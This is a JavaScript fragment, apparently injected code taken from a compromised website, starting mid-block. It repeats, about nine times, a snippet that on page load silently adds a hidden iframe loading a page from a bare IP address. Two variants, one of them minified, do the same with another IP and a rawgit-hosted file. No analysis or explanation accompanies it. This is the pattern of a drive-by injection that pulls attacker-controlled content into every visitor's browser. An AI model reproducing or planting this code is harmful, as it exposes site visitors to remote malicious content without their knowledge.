	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});